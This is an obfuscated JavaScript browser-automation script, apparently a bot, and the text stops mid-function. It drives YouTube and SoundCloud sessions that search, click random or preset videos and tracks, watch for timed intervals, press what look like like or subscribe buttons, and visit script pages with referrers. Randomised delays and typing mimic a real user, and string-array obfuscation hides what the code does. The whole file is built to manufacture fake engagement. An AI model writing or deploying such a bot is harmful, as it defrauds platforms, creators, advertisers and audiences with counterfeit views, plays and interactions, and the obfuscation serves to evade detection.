const Y = d,
  X = b,
  V = c;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1378 + -0x18a2 + 0x52a);
    let h = e[f];
    if (c['FSxZTI'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xf91 + -0x5 * -0x6f7 + -0x55 * 0x3a, r, s, t = -0x479 + -0x1 * -0x283 + 0x1f6; s = m['charAt'](t++); ~s && (r = q % (-0x1943 * 0x1 + -0x25f8 + 0x3f3f) ? r * (0x208d + -0x7dd + 0xc38 * -0x2) + s : s, q++ % (-0x179f + -0x1b2c + 0x32cf)) ? o += String['fromCharCode'](0x282 + -0x2 * -0x1147 + -0x2411 & r >> (-(0xc6a + -0x4c7 + -0x7a1) * q & -0x2075 + -0x12d9 + 0x5a * 0x92)) : -0x1b9b + -0x1 * 0xa85 + -0x2 * -0x1310) {
          s = n['indexOf'](s);
        }
        for (let u = -0x18c4 + -0x1 * 0x8de + 0xa * 0x35d, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1076 + -0x2 * -0x1304 + -0x1582))['slice'](-(-0x256b + -0x2 * -0x1111 + 0x34b));
        }
        return decodeURIComponent(p);
      };
      c['bfeifN'] = i, b = arguments, c['FSxZTI'] = !![];
    }
    const j = e[-0x1758 + 0x92c + 0xe2c],
      k = f + j,
      l = b[k];
    return !l ? (h = c['bfeifN'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1943 * 0x1 + -0x25f8 + 0x3f3c))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x208d + -0x7dd + 0xc58 * -0x2), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x8db7 + -0xa306 + 0x1a5ed + (0x787 + -0x11 * -0x619 + -0x3498) * random()) : await standardWaitForNetIdle(f), await wait(0xc6a + -0x4c7 + 0xbe5 + (-0x40ea + -0x25b3 + 0x1 * 0x8dad) * random()), -0x1b9b + -0x1 * 0xa85 + -0x1 * -0x2621;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x18c4 + -0x1 * 0x8de + 0x2 * 0x1a95), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1076 + -0x2 * -0x1304 + -0x1591;
}
async function randomWait() {
  return await wait(-0x256b + -0x2 * -0x1111 + 0x16d1 + (-0x1758 + 0x92c + 0x21b4) * random()), -0x1a60 + 0x3 * -0x851 + 0x3354;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x2a1 * -0x9 + -0x1 * -0xf3d + -0x2 * 0x1373, 0xd63 + 0x64 * 0x3 + 0xf8 * -0xf), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x512c + 0xd * 0x1231 + 0x223 * 0x25) * getRandomInt(-0x1 * -0x92b + 0x22a2 + 0x2bcb * -0x1, 0x1 * 0x1b22 + 0xa1 + -0x1bbe), h)), 0x95 * -0xd + 0x2b * -0x17 + 0xb6f;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x3 * -0xb32 + 0x108b + -0x3221;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x3d8 + 0x7e4 + -0xbbb]['split']('\x20');
    for (let k = -0x21c3 + 0xc5c + 0x1567; k < i['length']; k += 0x1 * -0xee3 + 0x1c3d + -0x7a * 0x1c)
      j += i[k] * h[i[k + (0x5 * -0x6f1 + -0x2531 + 0x47e7 * 0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xf * -0x10f + -0x1819 + 0x83e)['map'](l => Array['from'](l['children']))['flat'](0x1 * 0xfb6 + 0x828 + -0x29 * 0x95)['map'](l => l['childNodes'][0x58f + 0x1b * -0x65 + 0x519]['childNodes'][-0x95 * 0x2 + 0xa * 0x3b3 + -0x23d4]['childNodes'][0x55e * 0x1 + -0x1afb + -0x159e * -0x1]['childNodes'][-0x89 * -0x3b + -0x1 * 0x18cb + 0x4 * -0x1b2]['childNodes'][-0x22d0 + -0x1 * 0x1e4d + -0xa * -0x683]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x5c1 + 0x4b5 * 0x8 + -0x2781 * 0x1, -0x1347 + 0x66 * 0x2d + 0x14e1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xc * 0x883 + -0x5ccb * -0x1 + -0x43f1 * -0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x269 * 0x26 + -0xfbbc + 0x18a86) * getRandomInt(0x1af2 * -0x1 + -0x1e4e * 0x1 + 0x3942, -0x35a * 0x7 + 0x260a * -0x1 + -0x3d85 * -0x1), h);
  return await wait(i), 0x5db + -0xb7b + 0x5a1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x10 * 0x10b + -0x7de * 0x1 + 0x1 * -0x8d2]['children'][0x1de2 + -0x8e * 0x19 + -0x1004 * 0x1]['children'][0x1 * 0x2534 + -0x13f6 + -0x113e]['children'][-0x2 * 0xc82 + 0x1213 + 0x6f1 * 0x1]['children'][-0x1c45 + 0x1b9c + -0x1 * -0xa9]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x5d * 0x8 + -0x1a45 * 0x1 + -0x175e * -0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x7b4 * 0x4 + 0x4ed * 0x1 + 0xd9 * 0x1f + (0x221b + 0x4df + -0x26c8) * random()
  }), await wait(0x1 * 0xa97 + -0x1 * -0x1a74 + -0x2317 + (-0x71b * -0x3 + 0xdfa * -0x1 + -0x1 * 0x62b) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1178 + 0x24d3 + -0x3649 * 0x1]['childNodes'][-0x5 * 0x365 + 0x1859 + -0x1 * 0x75f]['childNodes'][-0xd14 + 0x2010 + -0x12fb * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x653 * 0x5 + -0x17f6 * -0x1 + -0x1 * -0x7ae]['childNodes'][0x7d0 * 0x3 + -0x5df * 0x5 + 0x5eb]['childNodes'][0xc4f + -0x36 * -0x74 + -0x24c5]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xb * 0x38c + 0x30 * -0x3a + -0x1c23),
          r = 0x49d * -0x7 + 0x1b92 * 0x1 + 0x4b9;
        for (let u = -0x95 * 0x25 + -0x21f6 + 0x377f; u < q['length']; u += -0x87b * -0x4 + 0x2 * 0xbf + -0x2368)
          r += q[u] * k[q[u + (-0x7ae + 0x3b7 * 0x3 + -0x1 * 0x376)]];
        return r;
      }(n);
  });
  await wait((0x4080 + -0x553d * -0x1 + -0x1 * 0x5b25) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1bde2 + -0x16e3 + -0xbc9f) * getRandomInt(-0x1 * 0x1c1 + -0x2 * 0x74b + 0x1058, 0x1377 + -0x6 * -0x35b + -0x278f), h + (-0x14 * -0xc0 + -0x234c + -0x4 * -0x9f5));
  return await wait(i), -0x1def + -0x2 * 0x2b1 + 0x16 * 0x19b;
}

function a() {
  const bo = [
    'W41Ujb/dMSofEW',
    'tmo/WRznWOddGJhcTx7cPa',
    'sWYhIJZmoS',
    'BMnLzc1KyxrHlq',
    'sXSWW6ZcTmo1kmoCW4ZcMW',
    'AgfZAa',
    'easyfork.o',
    'zw1PEc1WCM9Klq',
    'g,bts\x20stre',
    'Mozilla/5.',
    '-ix4OizkAn',
    'locking-a6',
    '=0.9',
    'BgvUz3rO',
    'nIBdHCkWWQeAWReJW7DR',
    '%9A%E6%9C%',
    'Dc1IDxr0B24TCW',
    'https://gr',
    'WO/dM8kIDCkUWR0cjMLL',
    '0dc5877e98',
    'W6JcHCk0amkUcSkOaSkiWRy',
    'close',
    'B21VBY5PBYbZyq',
    'ywDL',
    'u21PBgvFuMvKAq',
    'Ahr0Chm6lY93DW',
    'zwfZEwzVCMSUBW',
    'WQhdIYxcG8kWp8kFWRmxWPm',
    'Ahr0Chm6lY9VCa',
    'WRVdJ8o4dmoQCSoQW5iqDa',
    'DY55B3v0DwjLlG',
    'B3zLCNjPzgvnAq',
    'index.js\x20c',
    'pts/404065',
    'leanfolks/',
    'q8ooWQvBW5pdOd3cVGFdVW'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function keyWatch(f) {
  const R = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x8b * 0x25 + -0x1 * -0x248c + -0x64b * 0x9), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + R(0x10) + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * -0xdf4 + 0xf0 * -0x1a + 0x1624 + (-0x2af * 0x2 + -0x1b9 * 0xb + 0x1c39) * Math['random']());
    });
  }, -0xfa * -0x31 + 0x84 * 0x65 + 0x146 * -0x39);
  await wait(-0x550cb + -0x8016f + -0xe7 * -0x13d6);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x2 * -0x6ae7 + 0x377 * 0x6d + 0x71 * -0x329) * getRandomInt(-0x587 * -0x2 + -0x1ca * 0x1 + -0x940 * 0x1, 0xdf * 0x25 + -0xd0f + -0x1313)), clearInterval(h), 0x541 * -0x6 + 0x1 * -0xdc6 + 0x2d4d * 0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x2368 + -0xfe * 0x7 + 0x2a5a;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x99 * -0x29 + -0x3 * -0x9fd + 0x1 * -0x575;
    await randomWait();
  }
  return -0x13e8 + 0x136c + 0x7d;
}

function fetchRandomSC() {
  const S = c;
  return Math['random']() <= -0xe25 + 0x119 * 0x14 + 0x7cf * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + S(0x7) + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1 * 0xacf + -0x188c + 0x50d * 0x7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x909 + -0x14ce * 0x1 + 0x17 * 0x83 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x12 * -0xb5 + 0x1 * 0x16d9 + -0x515 * 0x7;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1298 + 0x5647 * -0x2 + -0x36f5 * -0x6 + getRandomInt(-0x4e5e + -0x140b + 0x9d01, -0x1f * 0x4cf + 0x1 * 0x1ef5 + 0xeb4c));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x4 * -0x235 + -0x3 * -0xa14 + 0x457 * -0x9), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x17e * -0x8 + -0x48d + 0x107d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1 * -0x8d5 + -0x10bf + 0x7ea, -0x144b + 0x2400 + 0x169 * -0xb)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x2 * 0xf2d + 0xa8a * -0x3 + -0xa6 * -0xe + floor((0x1384 + 0x13 * -0x51 + -0x999) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x71b45acc + 0x921b0348 + 0x5f995784),
          0x5df12 * -0x3 + 0x847b78 + 0x2 * 0x690df,
          -0x71d7 * -0x1 + 0x32 + -0x1 * -0xdf7,
          -0x1 * 0x23b7 + -0x127c + 0xd1 * 0x43
        ], y = [
          0x12d8 + -0xf1c + -0x3a4,
          -0x9e3 * -0x1 + -0x1 * -0x1448 + -0x1e1b,
          -0x2605 + -0x8a4 + 0x2eb1,
          -0x2248 * -0x1 + 0x3ce + 0x2616 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1952 + -0x780 + 0x20d3)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * 0xda9 + 0x2437 + -0x31e0; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * 0xbcd + 0x4 * -0x40d + 0x467) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x12cd + -0x9 * 0xc2 + 0x199f] = A[-0x7dc * 0x2 + -0xb9f + 0x57b * 0x5] = A[-0x18c * -0x17 + -0x1 * 0xd5d + -0x1636] = A[0x1594 + 0x14 * -0xe0 + -0x412] = A[0x616 * 0x3 + -0x22d * 0x7 + -0x304] = A[0x12e * 0x3 + 0x1764 + 0x2 * -0xd75] = A[-0x22eb + -0x44 * 0x23 + 0x2c3c] = A[-0x1971 + -0x1 * 0x2646 + 0x3fbd] = A[-0x1045 + -0x20f0 + 0x5c * 0x89] = A[-0x5f * -0x5b + 0x31 * -0x2f + -0x18be] = A[-0x8dc * 0x4 + -0xe73 + 0x18f6 * 0x2] = A[-0x613 + 0x1 * -0x1a11 + 0x202e] = A[-0x4 * -0x79f + -0x1 * 0xc0b + -0x1266] = A[0xbb + 0x2287 + -0x2 * 0x119b] = A[0x935 * -0x4 + -0x107 * -0x13 + 0x115c * 0x1] = A[0xb * -0x1cb + -0x2 * 0xfad + 0x1 * 0x3321] = A[-0x1bef + 0x30c + -0x1 * -0x18f2] = 0x13 * 0x47 + -0x1 * -0x1b41 + -0xb5 * 0x2e, this['blocks'] = A) : this['blocks'] = [
                -0x1 * 0x249d + -0x91 * 0x2c + -0x3b * -0x10b,
                0xf14 + 0x17 * -0x15d + 0x1047,
                -0x1 * -0x4c4 + 0xab1 + -0xf75,
                -0x255e + -0x1132 + -0x369 * -0x10,
                -0x192f + -0x101e + 0x294d,
                -0x1 * -0x2218 + -0x9cd * -0x1 + -0x2be5,
                -0x2684 + -0x256 * 0xd + 0x44e2,
                0xec7 + 0x1241 * 0x2 + -0x3349,
                -0x7 * -0x155 + -0x5 * -0x145 + 0x22 * -0x76,
                0x959 * 0x3 + -0x684 * -0x3 + 0xfdd * -0x3,
                -0x1 * 0x1235 + -0x3a9 + 0x15de,
                -0x1c96 + -0x582 + 0x2218,
                0xb5 + 0x1 * -0x6d9 + 0xc * 0x83,
                -0x2 * -0x6ad + -0x18c8 + -0x7 * -0x1a2,
                0x2303 + 0x26fd + 0x200 * -0x25,
                -0x2684 + -0x5 * 0x4ff + 0xcb3 * 0x5,
                0x1523 + 0x52f * 0x7 + -0x396c
              ], this['h0'] = 0x3 * 0xca56437 + -0x2e7 * -0x210ac5 + 0x1 * -0x1e914b67, this['h1'] = 0x6de5d4b1 * 0x4 + -0x8b2aabf4 + -0x4b * 0xceeb75, this['h2'] = -0x1 * -0x4435c7fb + -0x2de8a * -0x63dd + -0xca04661f, this['h3'] = -0xdad210e + -0x1039 * -0x1f97b + -0x228c6df, this['h4'] = -0x1419f713d + -0xec0772a8 + 0x19fb5f19 * 0x1d, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xa9 * 0x2f + 0x155b + -0x1a31 * 0x2, this['finalized'] = this['hashed'] = -0x1 * 0x1493 + 0x3 * 0x1a5 + 0xfa4, this['first'] = 0x7b8 + 0xca9 + -0x1460;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xd3e + -0x26ee + 0x342c, O = J['length'] || 0x1359 * 0x1 + 0x43 * -0x17 + 0x355 * -0x4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xc90 + 0x2027 + -0x1397 * 0x1, P[-0x7 * -0x31a + -0x23fb + 0xe45] = this['block'], P[0xed * -0x11 + -0x1e86 + 0x2e53] = P[0xa * -0x283 + -0x1 * 0x1ffd + 0x391c] = P[-0x1e3c + -0xae4 + 0x2922] = P[0x14ef + -0x1f96 + 0xaaa] = P[0x3 * 0xb02 + 0x49 * 0x3b + -0x31d5 * 0x1] = P[-0x23de + -0x2 * 0xc22 + -0x1d * -0x213] = P[0xd3f * -0x1 + -0x19c9 + -0x270e * -0x1] = P[0xc18 + -0xbb3 + -0x5e] = P[-0x214d + 0x2440 + -0x2eb * 0x1] = P[0x1 * 0x205f + -0x1c04 + -0x9e * 0x7] = P[0x1 * -0x10af + -0x2 * -0x928 + -0x197] = P[-0xdb + 0x2270 + -0x218a] = P[0x1 * 0xe2 + 0x8b3 + -0x989] = P[0x4f9 + -0x242 + -0x2aa * 0x1] = P[0x76 * 0x1 + 0xb72 + 0xbda * -0x1] = P[0xe2b + 0xc1e + -0x1a3a * 0x1] = -0x2379 + -0x1440 + -0x5 * -0xb25), K) {
                    for (N = this['start']; M < O && N < 0x104 * 0x4 + 0x2e3 * -0x5 + -0xa9f * -0x1; ++M)
                      P[N >> -0x10 * -0xe6 + 0x235f + 0x77 * -0x6b] |= J[M] << y[-0xb48 + -0xa35 + 0x1580 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x16b * 0xf + 0x4 * 0x673 + -0x447; ++M)
                      (L = J['charCodeAt'](M)) < -0x1f2 + -0x153b + 0x227 * 0xb ? P[N >> -0x14f5 + 0x1407 + -0x10 * -0xf] |= L << y[-0x2683 + 0x409 * -0x7 + 0x42c5 * 0x1 & N++] : L < 0x1 * 0x2e7 + -0xcc1 * -0x3 + -0x587 * 0x6 ? (P[N >> 0x11 * -0xb5 + 0xf * 0x20c + -0x7 * 0x2ab] |= (0x86 * -0x1a + 0x785 + -0x11 * -0x67 | L >> 0x1 * 0x21d0 + -0x2 * 0x20b + -0x1db4) << y[0xcad + -0x1e19 + 0x116f & N++], P[N >> -0xdbd * 0x1 + 0x9 * 0x2f7 + -0xb8 * 0x12] |= (-0x18 * 0x188 + -0x1920 + 0x10 * 0x3e6 | 0x18d * -0xc + 0x13b3 + -0xd8 & L) << y[-0x42d + 0xe3 * -0x8 + -0x2d2 * -0x4 & N++]) : L < 0xc55f + -0x1 * -0x4255 + -0x2fb4 || L >= -0x1 * -0x11b97 + -0xaef9 * 0x2 + 0x1225b ? (P[N >> -0xc7d + 0x4fe + 0x11 * 0x71] |= (-0x13bb + 0x1 * -0xad6 + 0x1f71 | L >> -0x3 * -0x8a9 + 0x25 * 0xb5 + -0x3418) << y[0x16b7 + 0x5a * -0x13 + 0xe * -0x125 & N++], P[N >> 0x26e * 0x1 + -0x1332 + 0x10c6] |= (0x1 * -0x1d48 + -0xf04 + 0x2ccc | L >> -0x82d * 0x2 + 0x18f2 + -0x892 & -0x8ad * -0x1 + -0x423 + 0x44b * -0x1) << y[0x267e + 0x1 * -0x1ed5 + -0x7a6 & N++], P[N >> 0x1660 + 0xb5 * -0x6 + -0x122 * 0x10] |= (-0x31d + -0x132c + 0x1 * 0x16c9 | -0x65 * -0x45 + -0x3 * 0x2f4 + -0x121e & L) << y[0x1 * 0x409 + -0x13 * -0x15b + 0x9 * -0x34f & N++]) : (L = 0x1 * -0x15989 + 0x1 * 0x1fd55 + -0x54 * -0x119 + ((-0x151e + 0xe4b + 0xad2 & L) << -0x2061 + 0x7f2 + 0x1879 | -0x2244 * 0x1 + 0x16dc + 0xf67 & J['charCodeAt'](++M)), P[N >> 0x16f * 0x6 + 0x1fec + 0x2 * -0x1442] |= (-0xc7d * -0x2 + -0x1fa1 + 0x797 * 0x1 | L >> -0x1df * 0x11 + -0x343 * -0x1 + -0x2 * -0xe4f) << y[-0xb * -0x304 + 0x23f + -0x4 * 0x8da & N++], P[N >> 0x3 * -0x23f + -0x20b4 + 0x2773] |= (0x53 + 0x2f * -0xc2 + 0x23cb | L >> 0x148c + 0x2a3 + -0x1 * 0x1723 & 0x9ab + -0x2 * 0xcbe + 0x1010 * 0x1) << y[0x10af + -0xac2 + -0x5ea & N++], P[N >> 0x53f + 0x12db * -0x1 + 0xd9e] |= (0x1 * 0x458 + 0x166b + 0x1b * -0xf9 | L >> 0x1 * 0xcc7 + 0xa74 + -0x1735 & -0x1bd * -0xd + 0x784 * -0x5 + 0xf3a) << y[-0x610 * 0x4 + 0x1052 + 0x1 * 0x7f1 & N++], P[N >> -0xf5b + 0xac * -0x1b + 0x2181] |= (-0x1 * -0xa1 + -0x639 + -0x3 * -0x208 | 0xe7e + 0x7 * 0x86 + -0x1 * 0x11e9 & L) << y[-0x1d * -0x135 + 0x11b7 + -0x34b5 * 0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x246d + -0x10bb * -0x1 + 0x1 * -0x34e8 ? (this['block'] = P[-0x2057 * 0x1 + 0xa * -0x18b + 0x2fd5], this['start'] = N - (0xd6d + -0x1 * -0x249b + 0x588 * -0x9), this['hash'](), this['hashed'] = 0x20fe * 0x1 + 0x3e9 * -0x9 + 0x234) : this['start'] = N;
                }
                return this['bytes'] > -0x199 * 0x820607 + 0x1e3f44d0b + -0x1438abdd && (this['hBytes'] += this['bytes'] / (-0x4f08 * -0x22832 + -0x4 * 0x5eb6ffe3 + 0x4 * 0x7418d3ff) << 0x1 * -0x1f79 + -0x215f + 0x40d8, this['bytes'] = this['bytes'] % (-0x7741067c + -0x9ae8a2dc + 0xa32082e * 0x34)), this;
              }
            }
            ['finalize']() {
              const T = c;
              if (!this['finalized']) {
                this['finalized'] = -0x2 * -0xb0a + -0x1 * 0x1147 + -0x4cc;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
